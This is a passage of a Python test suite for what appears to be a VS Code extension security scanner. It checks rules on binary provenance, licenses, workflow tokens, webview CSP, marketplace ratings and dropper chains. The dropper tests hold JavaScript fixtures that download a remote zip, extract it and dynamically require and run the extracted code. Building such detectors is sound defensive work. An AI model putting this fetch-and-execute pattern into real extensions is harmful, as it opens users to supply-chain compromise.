        self.assertEqual(report.verdict, "clean")

    def test_native_origin_gap_is_aggregated_into_one_hardening_note(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"native-many","version":"1.0.0"}',
                encoding="utf-8",
            )
            for name in ("server.node", "helper.node"):
                (root / name).write_bytes(b"native-binary-payload")

            report = scan_extension(root)

        binary_findings = [finding for finding in report.findings if finding.rule_id == "binary-without-origin"]
        self.assertEqual(len(binary_findings), 1)
        self.assertEqual(binary_findings[0].evidence.get("unverified_count"), 2)
        self.assertEqual(report.verdict, "clean")

    def test_artifact_controlled_checksum_does_not_prove_binary_origin(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"native-signed","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "server.node").write_bytes(b"native-binary-payload")
            (root / "server.node.sha256").write_text("deadbeef", encoding="utf-8")

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("repo-binary-artifacts", rule_ids)
        self.assertIn("binary-without-origin", rule_ids)

    def test_artifact_controlled_node_manifest_does_not_prove_binary_origin(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"native-package","version":"1.0.0"}',
                encoding="utf-8",
            )
            package = root / "node_modules" / "native-addon"
            package.mkdir(parents=True)
            (package / "package.json").write_text(
                '{"name":"native-addon","version":"2.0.0","repository":"https://example.invalid/native-addon",'
                '"files":["addon.node"]}',
                encoding="utf-8",
            )
            (package / "addon.node").write_bytes(b"native-binary-payload")

            report = scan_extension(root)

        self.assertIn("binary-without-origin", {finding.rule_id for finding in report.findings})

    def test_license_missing_is_posture_context_not_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"nolicense","version":"1.0.0"}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("license-missing", rule_ids)
        self.assertEqual(report.malware_score, 0)
        self.assertNotEqual(report.verdict, "malicious")
        self.assertNotEqual(report.verdict, "suspicious")

    def test_license_present_suppresses_license_missing_finding(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"licensed","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "LICENSE").write_text("MIT", encoding="utf-8")

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertNotIn("license-missing", rule_ids)

    def test_workflow_broad_token_permissions_is_posture_finding(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            workflows = root / ".github" / "workflows"
            workflows.mkdir(parents=True)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"broad-token","version":"1.0.0","repository":"https://github.com/example/broad-token"}',
                encoding="utf-8",
            )
            (workflows / "release.yml").write_text(
                "on: push\njobs:\n  release:\n    steps:\n      - run: echo ${{ secrets.GITHUB_TOKEN }}\n",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("workflow-token-permissions-broad", rule_ids)
        self.assertNotIn("dangerous-github-workflow", rule_ids)

    def test_webview_without_csp_meta_tag_is_low_hardening_evidence(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"webview-nocsp","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "function activate(context){"
                "const panel=vscode.window.createWebviewPanel('demo','Demo',1,{enableScripts:true});"
                "panel.webview.html='<html><body><script>doThing()</script></body></html>';"
                "}"
                "module.exports={activate};",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("webview-csp-missing", rule_ids)
        self.assertEqual(report.malware_score, 0)
        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.severity, "LOW")

    def test_webview_with_unsafe_csp_directive_is_flagged(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"webview-unsafe-csp","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "function activate(context){"
                "const panel=vscode.window.createWebviewPanel('demo','Demo',1,{enableScripts:true});"
                "panel.webview.html='<html><head><meta http-equiv=\"Content-Security-Policy\" "
                "content=\"default-src \\'self\\'; script-src * \\'unsafe-inline\\'\"></head>"
                "<body><script>doThing()</script></body></html>';"
                "}"
                "module.exports={activate};",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("webview-csp-unsafe-directive", rule_ids)
        self.assertNotIn("webview-csp-missing", rule_ids)

    def test_webview_with_strict_csp_is_not_flagged(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"webview-strict-csp","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "function activate(context){"
                "const panel=vscode.window.createWebviewPanel('demo','Demo',1,{enableScripts:true});"
                "panel.webview.html='<html><head><meta http-equiv=\"Content-Security-Policy\" "
                "content=\"default-src \\'none\\'; script-src {{cspSource}} \\'nonce-abc123\\'\"></head>"
                "<body><script nonce=\"abc123\">doThing()</script></body></html>';"
                "}"
                "module.exports={activate};",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertNotIn("webview-csp-missing", rule_ids)
        self.assertNotIn("webview-csp-unsafe-directive", rule_ids)

    def test_install_rating_mismatch_is_reputation_context_only(self) -> None:
        findings = _marketplace_metadata_findings("example.popular-bad-rating", {
            "extension_id": "example.popular-bad-rating",
            "found": True,
            "publisher_verified": True,
            "install_count": 200000,
            "rating_count": 50,
            "rating_average": 1.4,
        })

        rule_ids = {finding["rule_id"] for finding in findings}
        self.assertIn("install-rating-mismatch", rule_ids)
        self.assertIn("marketplace-low-rating", rule_ids)
        mismatch = next(finding for finding in findings if finding["rule_id"] == "install-rating-mismatch")
        self.assertEqual(mismatch["category"], "reputation")

    def test_install_rating_mismatch_does_not_fire_for_low_install_low_rating(self) -> None:
        findings = _marketplace_metadata_findings("example.small-bad-rating", {
            "extension_id": "example.small-bad-rating",
            "found": True,
            "publisher_verified": True,
            "install_count": 50,
            "rating_count": 5,
            "rating_average": 1.4,
        })

        rule_ids = {finding["rule_id"] for finding in findings}
        self.assertNotIn("install-rating-mismatch", rule_ids)


class SupplyChainDropperChainTests(unittest.TestCase):
    def _scan(self, extension_js: str):
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"dropper-test","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(extension_js, encoding="utf-8")
            return scan_extension(root)

    def test_download_extract_dynamic_load_fires_dropper_chain(self) -> None:
        report = self._scan(
            "const https = require('https');\n"
            "const AdmZip = require('adm-zip');\n"
            "const path = require('path');\n"
            "async function update(dest) {\n"
            "  const res = await fetch('https://cdn.example.net/payload.zip');\n"
            "  require('fs').writeFileSync(dest, Buffer.from(await res.arrayBuffer()));\n"
            "  const zip = new AdmZip(dest);\n"
            "  zip.extractAllTo('/tmp/module', true);\n"
            "  const plugin = require(path.join('/tmp/module', 'index.js'));\n"
            "  plugin.run();\n"
            "}\n"
        )
        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("supply-chain-dropper-chain", rule_ids)
        finding = next(f for f in report.findings if f.rule_id == "supply-chain-dropper-chain")
        self.assertEqual(finding.evidence.get("evidence_class"), "correlated")
        self.assertEqual(report.verdict, "suspicious")

    def test_integrity_verified_installer_does_not_fire_dropper_chain(self) -> None:
        report = self._scan(
            "const AdmZip = require('adm-zip');\n"
            "const crypto = require('crypto');\n"
            "const path = require('path');\n"
            "const EXPECTED_SHA256 = 'abc123';\n"
            "async function update(dest) {\n"
            "  const res = await fetch('https://cdn.example.net/tool.zip');\n"
            "  const bytes = Buffer.from(await res.arrayBuffer());\n"
            "  const digest = crypto.createHash('sha256').update(bytes).digest('hex');\n"
            "  if (digest !== EXPECTED_SHA256) { throw new Error('checksum mismatch'); }\n"
            "  require('fs').writeFileSync(dest, bytes);\n"
            "  new AdmZip(dest).extractAllTo('/tmp/module', true);\n"
            "  const plugin = require(path.join('/tmp/module', 'index.js'));\n"
            "  plugin.run();\n"
            "}\n"
        )
        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertNotIn("supply-chain-dropper-chain", rule_ids)

    def test_literal_requires_do_not_fire_dropper_chain(self) -> None:
        report = self._scan(
            "const AdmZip = require('adm-zip');\n"
            "async function update(dest) {\n"
            "  const res = await fetch('https://cdn.example.net/data.zip');\n"
            "  require('fs').writeFileSync(dest, Buffer.from(await res.arrayBuffer()));\n"
            "  new AdmZip(dest).extractAllTo('/tmp/data', true);\n"
            "}\n"
        )
        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertNotIn("supply-chain-dropper-chain", rule_ids)


if __name__ == "__main__":
    unittest.main()
